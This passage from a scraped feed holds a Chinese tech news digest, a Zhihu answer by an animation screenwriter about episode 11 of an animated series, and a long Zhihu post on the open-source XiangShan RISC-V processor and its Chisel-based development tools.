联合 Jio 推出入门智能机 JioPhone Next</h2>\n<p>Google 和印度运营商 Jio 于 6 月 24 日正式发布了廉价版本智能手机 JioPhone Next，该手机将采用优化过的 Android 系统提供了包括文字朗读、立即翻译等功能，另外手机还将搭配一个高质量并支持 HDR 的摄像头， 目前该机硬件配置和价格尚未公布，但将会 9 月 10 日在印度正式发售，未来将会在印度之外的地区上市。<a href=\"https://techcrunch.com/2021/06/24/google-and-jio-platforms-announce-worlds-cheapest-smartphone-jiophone-next/\" target=\"_blank\">来源</a></p>\n<h2>Apple 推送 iOS 15 beta 2 以及 iPadOS 15 beta 2</h2>\n<p>6 月 24 日，Apple 向开发者推送 iOS 15 beta 2 以及 iPadOS 15 beta 2。与此同时，Apple 还发布了适用于 Apple TV 和 HomePod 的 tvOS 15 beta 2 以及适用于 Apple Watch 的 watchOS 8 beta 2。</p>\n<p>如果你想了解更多关于新 beta 改动的详细信息，可以关注少数派之后的更多报道。<a href=\"https://9to5mac.com/2021/06/24/ios-15-beta-2-now-available/\" target=\"_blank\">来源</a></p>\n<h2>TiMi 工作室宣布成立 3A 游戏开发工作室</h2>\n<p>6 月 24 日，腾讯 TiMi 工作室发布推文宣布，在美国西雅图建立新工作室「TiMi Seattle」，</p>\n<p>该项目由 Scott Warner 与 Rosi Zagorcheva 带队，致力于 3A 级第一人称射击类游戏的开发。<a href=\"https://venturebeat.com/2021/06/23/timi-opens-seattle-studio-to-make-triple-a-games/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/6040826c42879a2426b9a231071519ea\"></figure><h2>你可能错过的文章</h2>\n<ul>\n<li>🎧 <a href=\"https://sspai.com/post/66851\" target=\"_blank\">旗舰 TWS 再试水，小米的旗舰主动降噪耳机用起来怎么样？</a>\n</li>\n<li>🚪 <a href=\"https://sspai.com/post/66914\" target=\"_blank\">开放空间中的独立，老房子装修思考</a>\n</li>\n<li>⌨️ <a href=\"https://sspai.com/post/67354\" target=\"_blank\">手腕救星还是烧钱摆件？聊聊人体工学键盘</a>\n</li>\n<li>🛒 <a href=\"https://sspai.com/post/67402\" target=\"_blank\">新玩意 068｜少数派的编辑们最近买了啥？</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67408"},{"title":"如何评价《画江湖之不良人》第四季第 11 集？","date":"2021-06-24 11:30:09","description":"\n<p>大家好，我是舒，播又来。</p>\n<p>很抱歉上一更有些水，之前去外地忙事情，现在回来了！今天稍微多来点，不喜请绕。</p>\n<p>在本集中大阴谋线已经捋清，毒公与李嗣源意在天下，大决战就要来了。之前我说这是我最喜欢的一集，就来说说原因吧——</p>\n<p>因为本季篇幅较短，可用的时长十分有限，因此我只有大概两集的时间留给鲜参，不得不说有些难度，处理不好容易让观众不入戏。蚩离与鲜参的情感段落尤为短小，最终选择以《花腰带》这首苗语的定情歌作为引子，我觉得结果还是达到预期了。这集不像其他集数大多是矛盾比较激烈的，相对平缓的剧情想要好看费的力气就要更大。20多分钟，得将本季涉及到的大事件捋清楚，还要将父母爱情在观众心里坐实。篇幅的平衡确实有些麻烦。但我觉得本集节奏尚可，因此比起前面那些难度较小的集数，我更喜欢这一集。<i>（刚刚看到许多匿名提了些问题就不一一解答了，片子里没有讲到的，就是本季中不需要讲的）</i></p>\n<p>父母的那几个拉手我挺喜欢的，的确更容易get到他们的情感。这样的方式其实国外的片子用的蛮多，而且国外更会省事，许多不好处理的部分就以音乐剧的形式来呈现了。王子跟公主唱首歌，俩人关系就确定了……而且最神奇的是还能让观众很相信他们的关系，比费劲兮兮编写故事中的起承转合要容易太多了。</p>\n<p>但有一点，就是音乐得把住。</p>\n<p>若森干活雷厉风行，我们剧本的创作时间基本上就是一周一集，修改剧本的时间紧而又紧，因此我把收益较高的部分划给了剪辑、音乐和音效。本季中我这边对于音乐与音效的的把控确实是花了很大力气。但其实正常情况下本不应该在这个部分操心，完全交给负责人即可。但无奈时间巨tm紧，想要最短的时间配合镜头出效果，我只能完全参与进去。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d6021a4f316bf7d4978398d51b16ef9a_720w.jpg?rss\" data-caption=\"我觉得动效公司和毛亮老师绝对得“恨”死我。这只是第一遍反馈，每个都是一个小红点，连起来都快成红线了\" data-size=\"normal\" data-rawwidth=\"974\" data-rawheight=\"354\" data-watermark=\"watermark\" data-original-src=\"v2-d6021a4f316bf7d4978398d51b16ef9a\" data-watermark-src=\"v2-9cd16e54d9957a4a5748cae63056a155\" data-private-watermark-src=\"v2-ade2153ff0e811b334e3d4f3c151c144\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f96267b3bd6c994f5001fa843403e552_720w.jpg?rss\" data-caption=\"某集的第二遍音效反馈\" data-size=\"normal\" data-rawwidth=\"2252\" data-rawheight=\"878\" data-watermark=\"watermark\" data-original-src=\"v2-f96267b3bd6c994f5001fa843403e552\" data-watermark-src=\"v2-f47871b670e05c95660a5daa147c1f42\" data-private-watermark-src=\"v2-0fb236f54a66ca0ee5d81a696f60e9c3\"></p>\n<p>先放一个我这边通过的花腰带（旋律demo）给大家听听。（知乎好像不能直接插入音频，附上网盘链接有兴趣的可以下载听一下）</p>\n<a data-draft-node=\"block\" data-draft-type=\"file-link-card\" href=\"https://pan.baidu.com/link/zhihu/7Vh2zduWhsimW5IEgmUjJ0QnatU38WbQUsl1==\" data-file-type=\"file\" data-file-source=\"baidu\" data-file-size=\"6072946\" data-file-extension=\"mp3\">花腰带最终DEMO-voc5-2.mp3</a><p>没通过的，但比较符合预期的，用在后续的剧情里有些不搭。</p>\n<a data-draft-node=\"block\" data-draft-type=\"file-link-card\" href=\"https://pan.baidu.com/link/zhihu/7Vh1zRuQhDiGaVd1d3SaFiVUdqOsRDRwdSJG==\" data-file-type=\"file\" data-file-source=\"baidu\" data-file-size=\"5368684\" data-file-extension=\"mp3\">花腰带废弃DEMO-voc-1.mp3</a><p><br></p>\n<p>剩下的demo太多了，就不一一给大家放了，我都没通过。光《花腰带》这个曲子就出了6、7个旋律不同的demo，其他配乐也差不多，在我这里反复了许多遍，毛老师辛苦了。。。如果还有下回，我一定不大半夜给你发语音了。</p>\n<p><br></p>\n<p>今就说到这儿吧，下周再唠。<i>（蚩离的模型是完颜政的事儿，就让它过去吧……没预算，不给做新模型了）</i></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/465504311/answer/1958249074?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">76 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/467001152?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第11集？</a><br><a href=\"http://www.zhihu.com/question/463029565?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季感情线？</a><br>\n","link":"http://www.zhihu.com/question/465504311/answer/1958249074?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"首届 RISC-V 中国峰会 2021 年 6 月 21 日起在上海举行，有什么值得关注的地方？","date":"2021-06-23 04:15:08","description":"\n<p>22号下午关于香山的报告，因为Zoom直播出现了技术故障，导致大家未能听到完整的报告，稍有些遗憾。考虑了一下，这里就把报告PPT直接贴出来，再加上我们在香山开发过程中的一些考虑和想法，跟大家分享。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8f4219b760442460fa7743602bb52bf6_720w.jpg?rss\" data-rawwidth=\"2035\" data-rawheight=\"1144\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8f4219b760442460fa7743602bb52bf6\" data-watermark-src=\"v2-0a4d567e9daf3c9851fcc39be43b39f1\" data-private-watermark-src=\"v2-37849addd056153ae64b11e462933d75\"></p>\n<p><b>这个报告主要回答四个问题：</b></p>\n<ul>\n<li>一、为什么要做香山？</li>\n<li>二、香山什么水平？</li>\n<li>三、香山怎么做的？</li>\n<li>四、香山未来如何发展？</li>\n</ul>\n<h2>一、为什么要做香山？</h2>\n<ol><li>2010年RISC-V诞生，迄今已有11年。如今，在RISC-V国际基金会网站上登记的各类商业或开源的RISC-V处理器核就有上百个（如下链接），<b>为什么还要做一个开源的高性能RISC-V核？</b>\n</li></ol>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//riscv.org/exchange/cores-socs/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">RISC-V Exchange: Cores &amp; SoCs - RISC-V International</a></p>\n<p>对于这个问题，我们和很多业界企业交流过，也做了很多调研与分析，这都让我们判断认为业界需要一个开源的高性能RISC-V核。另一方面，我们也在思考一个问题——<b>为什么CPU领域还没有一个像Linux那样的开源主线？1991年开源的Linux诞生，到今天正好30年</b>。如今，Linux不仅被工业界广泛应用，也成为学术界开展操作系统研究的创新平台。</p>\n<p>RISC-V是开放开源的指令集，<b>允许全世界任何人免费实现一个RISC-V处理器，可以是商用，也可以开源，这是和公司私有的X86/ARM指令集相比最大的区别之一</b>。但是，十年过去了，到现在还未能形成一个像Linux那样的开源主线。Berkeley的BOOM目标是一个高性能开源RISC-V核，但是BOOM代码仓库相对不开放，官方建议其他人实现任何功能都要事先和他们沟通，以确保不要与他们的计划产生冲突。根据GitHub官方的统计页面显示，<b>从2014年1月至今，为BOOM提交过超过100行代码修改的仅有8人</b>。由此可见，一定程度上因为BOOM严格的外部贡献政策，开源社区对BOOM的参与度并不高。</p>\n<p>所以，团队的唐丹博士和我一直认为要<b>建立一个像Linux那样的开源RISC-V核主线，既能被工业界广泛应用，又能支持学术界试验创新想法。最关键的是，一定要让它像Linux那样至少存活30年</b>！</p>\n<p>于是，“香山”诞生了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3a7f495574800afebdaa377394034847_720w.jpg?rss\" data-rawwidth=\"2040\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3a7f495574800afebdaa377394034847\" data-watermark-src=\"v2-c52687c3d5df75d5c99ab9f8f5a667b4\" data-private-watermark-src=\"v2-0efd422805882b36279d7d514ac92ca4\"></p>\n<p>2. <b>我们做了一年多的准备工作——申请经费，启动“一生一芯”计划培养人才，建立团队，寻找合作伙伴……这期间得到了太多太多人的支持和帮助：</b>计算所孙凝晖院士帮我们多处找经费，国科大全力支持“一生一芯”计划，鹏城实验室支持我们建立起后端物理设计团队，多位计算所老所友毅然决定参与开源主线等等，就不一一列举了。</p>\n<p>终于，香山正式启动了——<b>2020年6月11日，香山在GitHub上建立了代码仓库</b>。</p>\n<p>短短的的一年时间里，<b>25位同学和老师参与了香山的开发。821次主分支代码合并，3296次代码提交（commit），5万余行代码，400多个文档，记录了香山的成长过程</b>。我们的理念是<b>代码开源、流程开放、文档公开</b>。这期间，有企业直接参与开发，也有企业表达参与意向，都因为认同开源理念，愿意一起来共建开源的香山。这些来自工业界的积极反馈，给与我们极大的鼓舞和信心，<b>让我们更坚定地去践行“科研重工业模式”</b>。</p>\n<p>“科研重工业模式”，是 2020年1月我为《中国计算机学会通讯（CCCF）》写了一篇卷首语《<b>伯克利科研模式的启发</b>》中提出的：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/268197755\" class=\"internal\">袁岚峰：CCCF卷首语 ：伯克利科研模式的启发 | 包云岗</a></p>\n<blockquote>回顾伯克利的科研历程，可以发现他们在过去几十年研制了大量的原型系统，不仅推动了技术进步甚至颠覆产业，也培养了一代代杰出人才（其中多位获得图灵奖）：1950年代CALDIC系统(Doug Englebart)，1960年代Project Genie系统(Butler Lampson与Chuck Thacker)，1970年代BSD Unix操作系统与INGRES数据库系统(Michael Stonebraker)，1980年代RISC处理器(David Patterson)，1990年代RAID存储系统与NOW机群系统……如果用一句话来<b>总结伯克利的科研模式</b>，那就是——<b>热衷于研制真正能改变现状的原型系统，哪怕需要大量工程投入</b>。国重主任孙凝晖院士称之为“<b>科研重工业模式</b>”。</blockquote>\n<p>“科研重工业模式”，我们不想纸上谈兵，我们要用行动去实践。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a511b0024ce4cb05c4d6b15754c04ea2_720w.jpg?rss\" data-rawwidth=\"2046\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a511b0024ce4cb05c4d6b15754c04ea2\" data-watermark-src=\"v2-bec93682f39b8aab1a1584b3512604e2\" data-private-watermark-src=\"v2-513820de9a80756d0cc49135a1a38905\"></p>\n<h2>二、香山什么水平？</h2>\n<p>3. 香山是一款开源RISC-V处理器核，<b>它的架构代号以湖命名</b>。<b>第一版架构代号是“雁栖湖”</b>，这是带有浓重国科大情节的同学们起的名字，因为他们研一都在怀柔雁栖湖待了一年。“雁栖湖”RTL代码于2021年4月完成，计划于7月基于28nm工艺流片，目前频率为1.3GHz。</p>\n<p><b>第二版架构代号是“南湖”</b>，这是向建党100周年致敬。“南湖”计划在今年年底流片，将采用14nm工艺，目标频率是2GHz。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-44ffc47f05bf3a3cf52251577b7fc838_720w.jpg?rss\" data-rawwidth=\"2047\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-44ffc47f05bf3a3cf52251577b7fc838\" data-watermark-src=\"v2-8cd4e5dc1378177392484ea68e250018\" data-private-watermark-src=\"v2-f5e120cfb9f3b45a9121ffb9e8bf0a49\"></p>\n<p>香山选择什么开源许可证？这个问题纠结了我们好一阵子。后来，我们专门向北京大学周明辉教授请教，小伙伴们制定了4种开源许可证方案。<b>在反复对比权衡后，最终选择了如下表格中的方案①——木兰宽松版许可证（MulanPSLv2）</b>。在此，特别感谢北大周明辉老师的专业指导！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5fb476460aa3485b667fb3281acfb34e_720w.jpg?rss\" data-rawwidth=\"1147\" data-rawheight=\"633\" data-size=\"normal\" data-caption=\"开源许可证方案对比（徐易难整理）\" data-watermark=\"watermark\" data-original-src=\"v2-5fb476460aa3485b667fb3281acfb34e\" data-watermark-src=\"v2-a3cfb3d7966e2aaa0cb8c1fc6201222c\" data-private-watermark-src=\"v2-752c7b238a13ffd788c289c43e06eca2\"></p>\n<p>4. “雁栖湖”架构是一个<b>11级流水、6发射、4个访存部件的乱序处理器核</b>。在发射宽度上已经可以和一些ARM高端处理器核相当，但还未进行充分优化，因此实际性能还有不小的差距。我们希望未来通过持续迭代优化（“南湖”--&gt;\"X湖\"--&gt;\"Y湖\"--&gt;……），<b>性能达到ARM A76的水平</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ed07d7468848b12c5a126ece025b7922_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1145\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ed07d7468848b12c5a126ece025b7922\" data-watermark-src=\"v2-79dce8b78719a8b35fcd0ff2747a156a\" data-private-watermark-src=\"v2-dac56bc271f0fc46d4542ede366333dc\"></p>\n<p>5. 我们<b>基于GitHub CI构建了一套流程化的自动回归测试框架</b>，并在过去大半年不断增加测试负载，从cputest，risc-tests到Linux，到SPECCPU workload。这套自动回归测试框架在保障和验证芯片的正确性。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-978adaf22f9bc3b9084863d3b6a599dd_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-978adaf22f9bc3b9084863d3b6a599dd\" data-watermark-src=\"v2-f3ab1bc6f814a5451bca1a14e6ebd1c8\" data-private-watermark-src=\"v2-927bb1e524c27c5b967a4e7d5bdad8c8\"></p>\n<p>每个大项目总会有一些激动人心的时刻，这段30秒的小视频记录了香山在FPGA上启动Linux/Debian的时刻，略带喜感。</p>\n<a href=\"https://www.zhihu.com/zvideo/1390842319982120960\">香山在FPGA上启动Linux/Debian</a><h2>三、香山怎么做的？</h2>\n<p>6. 香山开发初期速度非常快：<b>6月11日建立代码仓库，7月6日乱序流水线便已完成，能正确运行CoreMark，不到一个月时间；9月12日，Linux正确启动；10月22日，Debian正确启动</b>。</p>\n<p>接下来便是大半年的结构优化、性能调优、时序优化工作，<b>香山架构几乎相当于重构了一遍</b>。一个典型的例子，香山的第一版分支预测器（BPU）参考了BOOM的BPU，但后端评估频率只能达到800MHz（28nm）。于是负责BPU设计的勾凌睿在几位老师的指导下，不断优化BPU结构，最终将频率提升到了1.4GHz。</p>\n<p>这期间，小伙伴们纷纷自己动手，<b>开发了各种各样的优化和调试工具，大大地加速了优化和验证环节</b>。这让我真心佩服这批90后——他们真是<b>充满了创造力，从工作到生活，而主要驱动力之一就是“省（tou）时（lan）”</b>。比如宁可自己写个程序自动点外卖，也懒得打开手机看菜单点。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e798f0abbb38efa99a9765524da59021_720w.jpg?rss\" data-rawwidth=\"2045\" data-rawheight=\"1152\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e798f0abbb38efa99a9765524da59021\" data-watermark-src=\"v2-ec59fc3a633b4fa91b01f4f9e44c21b7\" data-private-watermark-src=\"v2-3aa44b783e677eb869af89d98f034dbf\"></p>\n<p>7. 香山的开发至少有两个重要的决策，<b>第一个便是选择敏捷设计语言Chisel</b>。很多人质疑Chisel，排斥Chisel，但是我们在充分评估后，还是决定使用Chisel。</p>\n<p>我们团队是在2016年开始使用Chisel，一开始组里也充满质疑。2018年，我们设计了两组定量的对比实验，找了2位同学用Chisel、1位工程师用Verilog分别设计一个L2 Cache模块。通过一系列量化对比，得出了如下三个结论：</p>\n<ol>\n<li>\n<b>Chisel开发效率远高于Verilog</b>；</li>\n<li>\n<b>实现相同的功能，Chisel代码量仅为Verilog的1/5</b>（因此香山的5万行Chisel代码相当于25万行Verilog代码）；</li>\n<li>\n<b>Chisel的开发质量不比Verilog差</b>。</li>\n</ol>\n<p>后来将实验结果发表在2019年1月的《计算机研究与发展》。最近去华为交流，才知道这些<b>对比结果也推动了华为内部组建了Chisel开发团队，如今华为也是Chisel的支持者</b>。</p>\n<p>2020年，我们又<b>基于Chisel完成了一款8核标签化RISC-V处理器的流片</b>，这是基于Rocket处理器核进行了标签化体系结构改造，采用28nm工艺流片。虽然因为时间紧张，并没有进行细致的后端优化，但芯片返回后也还能正常运行在1.2GHz。这是一颗有一定复杂度的8核SoC芯片，但Chisel能应对。所以，<b>我们相信Chisel可用来开发复杂芯片</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5f2ae6a85f722d5e3366013ec03ae753_720w.jpg?rss\" data-rawwidth=\"2045\" data-rawheight=\"1160\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5f2ae6a85f722d5e3366013ec03ae753\" data-watermark-src=\"v2-d8a370507e3af42c53a7e4a804cd18a2\" data-private-watermark-src=\"v2-4c6fdf6695a2a5878414ec24eeba803d\"></p>\n<p>8. 在开发香山的过程中，<b>我们团队积累了丰富Chisel开发经验</b>。小伙伴们（徐易难、王凯帆、蔺嘉炜、余子濠、金越）准备了6个报告，将会在6月25日的CCC Workshop上和大家分享。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2d397ff60a8557b49d489440a17789a8_720w.jpg?rss\" data-rawwidth=\"2050\" data-rawheight=\"1159\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2d397ff60a8557b49d489440a17789a8\" data-watermark-src=\"v2-79ca8fb1ea50f57c6407ba9b1745893b\" data-private-watermark-src=\"v2-f4305cdafd1fe2b5363e779be6941bad\"></p>\n<p>9. 另一个重要决策就是<b>高度重视构建支持敏捷设计的流程与工具</b>。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d7ba7b1ee3c03c3d330c673c3c77e538_720w.jpg?rss\" data-rawwidth=\"2051\" data-rawheight=\"1153\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d7ba7b1ee3c03c3d330c673c3c77e538\" data-watermark-src=\"v2-2659375772c110108238f6ccea20dca5\" data-private-watermark-src=\"v2-aedb701aa403bfd1fb31d137faba01cc\"></p>\n<p>我们在开发香山的过程中，<b>一直在强调流程、平台、基础设施的重要性</b>。我更多是扮演了啦啦队队长的角色，而小伙伴们则真正将理念落实到了具体行动。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-02c89c0be6d728e2c0be8873b6894e36_720w.jpg?rss\" data-rawwidth=\"713\" data-rawheight=\"916\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-02c89c0be6d728e2c0be8873b6894e36\" data-watermark-src=\"v2-eefe816e98f6557494a91bde531e2cb1\" data-private-watermark-src=\"v2-df90cc6a088502c5fe272fc5e29d7c04\"></p>\n<p>10. 为了更好地支持Chisel开发与调试，为了更快地捕捉、复现和定位bug，为了更准确地评估优化技术的性能收益，<b>小伙伴们开发十余种各具特色的工具。这些工具支撑起了一套处理器芯片敏捷开发的流程</b>。当然，这套流程还比较初级，尚不系统化。我们也期待更多的开源开发者加入，一起完善这套敏捷设计流程。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b5f9d782da03cdab896d5ebda0b1fcb7_720w.jpg?rss\" data-rawwidth=\"2053\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b5f9d782da03cdab896d5ebda0b1fcb7\" data-watermark-src=\"v2-e99302b14413b66ed10864e73158e8b5\" data-private-watermark-src=\"v2-e306425f8f508f4aef81074afe3d964b\"></p>\n<p>11. 下面举几个工具的例子。NEMU是由余子濠在南大本科时便开始开发的一款教学模拟器。在计算所读博期间，他凭借一人之力一直在持续改进和优化NEMU，使<b>NEMU成为一个效率接近QEMU的高性能解释器——启动Debian甚至比QEMU还要快18.2%</b>（9.87s vs. 12.07s）。</p>\n<p>更重要的是NEMU是指令解释器，<b>可以针对每一条指令进行动态分析</b>；相比而言，QEMU的翻译粒度是基本块，无法跟踪每一条指令。事实上，NEMU的这种指令解释器机制，成为了香山开发中正确性验证框架Difftest的基础。（余子濠将会在6月23日下午介绍NEMU）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b53034310c68487d9d3595083c02668a_720w.jpg?rss\" data-rawwidth=\"2054\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b53034310c68487d9d3595083c02668a\" data-watermark-src=\"v2-493d0a0c9ddeca048251768c2068e534\" data-private-watermark-src=\"v2-5e4de996f012afc2d6f11eb2c2745ae0\"></p>\n<p>12. Cache是处理器中非常核心的模块，尤其是要支持一致性协议的Cache更为复杂。为此，小伙伴们<b>开发了一套专门验证支持TileLink一致性协议的Cache模块测试框架Agent Faker</b>，发现了好几个Cache模块的bug。（张传奇将会在6月25日上午介绍这个工作）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ca67a73de8769c982c718ec755c34e2d_720w.jpg?rss\" data-rawwidth=\"2050\" data-rawheight=\"1158\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca67a73de8769c982c718ec755c34e2d\" data-watermark-src=\"v2-e4fddc41025bd2cb6ecef9cfbc5ed778\" data-private-watermark-src=\"v2-bc7eae5544e980b94efd2c645cdf4a88\"></p>\n<p>13. Difftest是一个基于NEMU的指令集在线差分验证框架。它的一端是模拟器，提供处理器执行的黄金标准；另一端是运行RTL的仿真器，在仿真过程中会将指令数、中断、MMIO、微结构状态等信息发送给NEMU进行比对，从而判断RTL实现的正确性。</p>\n<p>Difftest最早是由余子濠实现，后来王凯帆进行优化，<b>其中一个最重要的改进就是SMP-Difftest，支持多核SMP的全系统仿真，并且支持Cache一致性、内存一致性等需要软硬件协同的问题</b>。（王凯帆将会在6月24日下午介绍Difftest）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cc6bf5873d1fd09c1ecc61f427494240_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1161\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cc6bf5873d1fd09c1ecc61f427494240\" data-watermark-src=\"v2-b465709f917a39b99b40add9318a440a\" data-private-watermark-src=\"v2-80f2b672aacd3b9f1daadf98cf0cee40\"></p>\n<p>14. 如何快速捕捉、复现、定位bug是调试过程中非常关键的步骤，很多时间都是消耗在这个阶段。小伙伴们提出了<b>一种创新的轻量级仿真快照技术——把整个仿真程序看成是一个进程，利用fork机制创建子进程</b>。然后父进程继续执行，子进程暂停。当父进程出错时，则可以恢复到子进程进行调试。 LightSSS这个机制和Verilator仿真器自带的Savable机制相比，<b>单次快照时间缩短了近7000倍！</b>（余子濠将会在6月23日下午介绍LightSSS）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d06151ab7fdc64c000d348ddef83c940_720w.jpg?rss\" data-rawwidth=\"2049\" data-rawheight=\"1156\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d06151ab7fdc64c000d348ddef83c940\" data-watermark-src=\"v2-92cb4d30fea4ad3b9753de8c8472ef4e\" data-private-watermark-src=\"v2-6aa72886784ef4a4b800b816160c5e06\"></p>\n<p>15. 很多人质疑Chisel不方便调试。小伙伴们则充分<b>利用了Chisel的可以自定义Firrtl Transform的特点，设计了一套新型的硬件敏捷调试栈，可将基于波形的调试转换为基于事件的调试</b>。我们设计了一套工具，可以直接将高层语义新型从波形中提取出来，并进行可视化。为此，还专门设计了一个Xiang语言。（蔺嘉炜将在6月23日下午介绍该工作）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-30de046418f5d22ee635b92e35642145_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1155\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-30de046418f5d22ee635b92e35642145\" data-watermark-src=\"v2-e3a37d7478d855f441c7d6c0e8b47a29\" data-private-watermark-src=\"v2-9235bb2c97526db9d5156cc8943b7a7d\"></p>\n<p>16. 处理器性能优化环节最关键是要快速准确地评估优化技术带来地性能收益。如果评估过程需要几天时间，那将会严重影响迭代优化效率。小伙伴们<b>设计了一个敏捷性能评估框架BetaPoint，它利用了三个机制——Sampling机制、Generic Full System Checkpoint机制和Functional Warmup机制，实现了可以在10个小时内估算出处理器地SPEC分数</b>。（周耀阳将会在6月23日傍晚介绍BetaPoint）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fa4dbb9e42f40e4482a2a4811a09d0b1_720w.jpg?rss\" data-rawwidth=\"2052\" data-rawheight=\"1159\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fa4dbb9e42f40e4482a2a4811a09d0b1\" data-watermark-src=\"v2-1247f5f2b72bb0c2e61cbf704336313f\" data-private-watermark-src=\"v2-0edb35c8e9cf480ed1058c99ec1e948b\"></p>\n<p>17. 整个香山开发团队将在这次峰会上和大家分享22个技术报告。这些报告都是清一色的90后，很多都是95后：<b>勾凌睿、胡博涵、金越、李昕、刘志刚、蔺嘉炜、王华强、王诲喆、王凯帆、徐易难、余子濠、张传奇、张发旺、张林隽、张紫飞、张梓悦、周耀阳、周意可、邹江瑞</b>；此外还有多位参与香山开发的同学这次并没有投稿。这些小伙伴们在香山的开发过程中做出了不可替代的贡献。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b614f2e01b863c5cfb908fa1a1f9aa51_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1157\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b614f2e01b863c5cfb908fa1a1f9aa51\" data-watermark-src=\"v2-0945f698ffceb06040095f652e694df8\" data-private-watermark-src=\"v2-d96852c6d919197dfc95f97278d458db\"></p>\n<h2>四、香山未来如何发展？</h2>\n<p>18. 目前香山正在进行下一代架构“南湖”的开发，目标是今年年底流片，<b>基于14nm工艺频率达到2GHz，SPECCPU分值达到10分/GHz</b>。这是一个很有挑战的目标，需要对架构进行大幅度的优化改进。</p>\n<p>前几天，小伙伴们专门去了一趟嘉兴南湖，研讨香山未来的发展。除了技术，我们再一次聚焦到流程与平台。此前构建的敏捷设计流程与平台支撑了20多人的开发团队，这远远不够。现在我们需要考虑的是该<b>如何构建一套开源、开放、规范的开放流程，能支撑2000人的开源社区一起开发</b>。</p>\n<p>支持成千上万人一起开发开源软件，这已经有成功的经验。但是<b>如何支持数千人一起开发开源处理器，目前还没有可以参考的案例，只能靠我们自己摸索。也期待各界专家给我们更多的指导和建议。</b></p>\n<p><img 